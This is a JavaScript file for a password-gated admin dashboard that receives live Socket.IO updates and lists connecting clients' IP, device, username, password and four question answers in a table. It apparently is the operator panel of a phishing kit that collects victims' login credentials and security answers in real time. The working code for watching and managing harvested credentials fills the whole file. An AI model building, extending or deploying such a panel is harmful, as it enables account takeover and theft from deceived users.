import { io } from "https://cdn.socket.io/4.7.5/socket.io.esm.min.js";

// you know, writing this from a windows VDI with some latency and having to redeploy docker containers
// on proxmox every time i wanted to test anything on my phone has been an absolutely terrible
// experience and i wish i would have opted for a cleaner solution...

const socketProto = window.location.protocol === "https:" ? "wss" : "ws";
const socket = io(`${socketProto}://${window.location.hostname}`, { path: "/report/" });

// authenticate
const password = localStorage.getItem("pw") ?? prompt("give me the password");

const waitAuth = new Promise((resolve) => {
    // not gonna timeout just check inspect element to see if your reverse proxy is broken
    socket.on("adminauth", (val) => {
        if (!val.success) {
            alert("you're not allowed here");
            localStorage.removeItem("pw");
            return;
        }
        resolve();
    });
});

// fixed race condition
console.log("sending auth");
socket.emit("admin", { password });

console.log("waiting for auth");
await waitAuth;
console.log("authenticated");

// i dont even know how i came up with this code pattern but its somehow foolproof
// yet very ugly and i hate it

// security: 0,
// but wait, risk: 0
// so i guess it's a win-win right....right? (satire)
localStorage.setItem("pw", password);

const entries = [];
const entryMap = new Map();

// clear button
document.getElementById("clearBtn").addEventListener("click", () => {
    for (const entry of entries) {
        entry.tableEntry.remove();
    }
    entries.length = 0;
    entryMap.clear();
});

socket.on("client", ({ sid }) => {
    console.log("new client" + sid);

    const tableEntry = document.createElement("tr");

    // Placeholders
    const ip = document.createElement("td");
    tableEntry.appendChild(ip);

    const device = document.createElement("td");
    tableEntry.appendChild(device);

    const username = document.createElement("td");
    tableEntry.appendChild(username);

    const password = document.createElement("td");
    tableEntry.appendChild(password);

    const q1 = document.createElement("td");
    tableEntry.appendChild(q1);

    const q2 = document.createElement("td");
    tableEntry.appendChild(q2);

    const q3 = document.createElement("td");
    tableEntry.appendChild(q3);

    const q4 = document.createElement("td");
    tableEntry.appendChild(q4);

    const inactivity = setTimeout(() => {
        entryMap.delete(sid);
        tableEntry.remove();
    }, 45000);

    const dat = {
        tableEntry, sid, inactivity, ip, device, username, password, q1, q2, q3, q4
    }

    for (const [k,v] of Object.entries(dat)) {
        if (k === "tableEntry" || k === "sid" || k === "inactivity")
            continue;
        v.innerText = "...";
    }

    // if count if entries is more than 15, remove the first one
    if (entries.length === 15) {
        console.log("outta here")
        const entry = entries.shift();
        entryMap.delete(entry.sid);
        entry.tableEntry.remove();
    }

    entries.push(dat);
    entryMap.set(sid, dat);

    // Append to table
    console.log("push2table");
    document.getElementById("db").appendChild(tableEntry);
});

socket.on("update", (data) => {
    const sid = data.sid;
    console.log("update" + sid);

    const entry = entryMap.get(sid);
    if (entry === undefined)
        return;

    console.log("entry found")

    // things to change
    for (const [key, value] of Object.entries(data)) {
        console.log("update" + key);
        if (entry[key] === undefined || key === "sid" || key === "tableEntry" || key === "inactivity")
            continue;

        if (key === "username") {
            if (entry.inactivity !== undefined) {
                clearTimeout(entry.inactivity);
                console.log("live client " + sid)
            }
        }

        entry[key].innerText = value;
    }
});
